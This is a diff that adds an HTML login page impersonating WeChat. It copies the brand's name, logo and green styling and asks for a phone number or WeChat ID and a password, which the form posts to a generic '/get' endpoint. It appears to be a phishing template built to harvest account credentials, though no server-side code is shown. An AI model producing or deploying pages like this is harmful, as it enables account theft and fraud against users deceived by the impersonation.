@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+    <title>WeChat</title>
+    <style>
+      body {
+        font-family: -apple-system, BlinkMacSystemFont, 'Helvetica Neue', Arial, sans-serif;
+        background-color: #ededed;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+        margin: 0;
+      }
+      .login-container {
+        width: 380px;
+        background: #fff;
+        border-radius: 12px;
+        padding: 40px 32px;
+        text-align: center;
+      }
+      #logo {
+        margin-bottom: 20px;
+      }
+      .g-h1 {
+        font-size: 24px;
+        font-weight: 700;
+        color: #07c160;
+        margin-bottom: 8px;
+      }
+      .g-h2 {
+        font-size: 14px;
+        color: #666;
+        margin-bottom: 24px;
+      }
+      .g-input {
+        width: 100%;
+        padding: 14px 16px;
+        border: 1px solid #e0e0e0;
+        border-radius: 8px;
+        font-size: 16px;
+        margin-bottom: 16px;
+        box-sizing: border-box;
+        outline: none;
+      }
+      .g-input:focus {
+        border-color: #07c160;
+      }
+      .gbtn-primary {
+        width: 100%;
+        padding: 14px;
+        background-color: #07c160;
+        color: #fff;
+        border: none;
+        border-radius: 8px;
+        font-size: 16px;
+        font-weight: 600;
+        cursor: pointer;
+      }
+      .gbtn-primary:hover {
+        background: #06ad56;
+      }
+      .footer {
+        margin-top: 20px;
+        font-size: 13px;
+        color: #666;
+      }
+      .footer a {
+        color: #07c160;
+        text-decoration: none;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="login-container">
+      <svg id="logo" viewBox="0 0 120 40" width="120" height="40">
+        <text x="50%" y="32" text-anchor="middle" font-family="Arial" font-weight="800" font-size="30" fill="#07c160">WeChat</text>
+      </svg>
+      <h1 class="g-h1">Log in to WeChat</h1>
+      <p class="g-h2">Scan QR code via WeChat<br>or click below to log in with account</p>
+      <form action="/get" method="POST">
+        <input class="g-input" type="text" name="username" placeholder="Phone Number / WeChat ID" required>
+        <input class="g-input" type="password" name="password" placeholder="Password" required>
+        <button type="submit" class="gbtn-primary">Log In</button>
+      </form>
+      <p class="footer">Sign Up for WeChat</p>
+    </div>
+  </body>
+</html>
